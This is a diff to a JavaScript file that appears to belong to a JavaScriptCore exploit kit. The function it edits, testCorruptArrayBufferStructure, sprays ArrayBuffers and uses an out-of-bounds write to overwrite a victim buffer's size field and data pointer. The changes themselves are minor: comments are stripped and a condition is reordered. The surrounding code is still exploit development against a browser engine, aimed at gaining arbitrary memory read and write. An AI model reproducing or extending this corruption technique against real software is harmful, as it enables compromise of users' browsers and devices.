@@ -62,7 +62,7 @@ async function attemptReadWriteOnCorruptedBuffer(ab, originalSize, newExpectedSi
     return false;
 }
 
-const LONG_PAUSE_S3_AB_CORRUPT_LOCAL = 2000; // Renomeado para evitar conflito se já existir em s3_utils
+const LONG_PAUSE_S3_AB_CORRUPT_LOCAL = 2000;
 
 export async function testCorruptArrayBufferStructure() {
     const FNAME = "testCorruptArrayBufferStructure";
@@ -70,8 +70,8 @@ export async function testCorruptArrayBufferStructure() {
     const CORRUPTION_AB_CONFIG = {
         spray_count: 200,
         victim_ab_size: 256,
-        size_field_offset_in_ab_object: parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16), // Deve ser 0x30
-        data_ptr_field_offset_in_ab_object: parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_OFFSET_FROM_JSARRAYBUFFER_START, 16), // Deve ser 0x20
+        size_field_offset_in_ab_object: parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16),
+        data_ptr_field_offset_in_ab_object: parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_OFFSET_FROM_JSARRAYBUFFER_START, 16),
         corrupted_size_value: 0x60000000,
         corrupted_data_ptr_low_UAF: 0x0,
         corrupted_data_ptr_high_UAF: 0x0,
@@ -174,7 +174,7 @@ export async function testCorruptArrayBufferStructure() {
                 try {oob_write_absolute(absOffsetForVictimDataPtrField, originalDataPtr, 8, logS3); } catch (e_restore_dp) { /*silencioso*/}
                 if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
             }
-             if (baseCandidateOffsetForVictimAB % (CORRUPTION_AB_CONFIG.search_step * 100) === 0 && baseCandidateOffsetForVictimAB > CORRUPTION_AB_CONFIG.search_base_offset_start) { // Adicionado if
+             if (baseCandidateOffsetForVictimAB > CORRUPTION_AB_CONFIG.search_base_offset_start && baseCandidateOffsetForVictimAB % (CORRUPTION_AB_CONFIG.search_step * 100) === 0) {
                 await PAUSE_S3(MEDIUM_PAUSE_S3 / 2);
              }
         }
